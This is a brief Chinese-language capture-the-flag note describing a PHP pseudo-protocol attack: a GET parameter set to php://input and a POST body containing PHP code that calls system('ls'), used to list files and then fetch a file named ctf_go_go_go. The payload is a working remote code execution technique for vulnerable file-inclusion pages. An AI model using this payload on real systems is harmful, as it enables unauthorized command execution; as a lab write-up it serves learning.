#PHP伪协议
```
?url=php://input        -- GET请求的url中拼接伪协议
<?php system('ls')?>    -- post请求内容构造需要执行的代码
```
![[Pasted image 20230116163051.png]]
得到文件名
`ctf_go_go_go`
之后输入
```
?url=ctf_go_go_go
```
得到
![[Pasted image 20230116163212.png]]
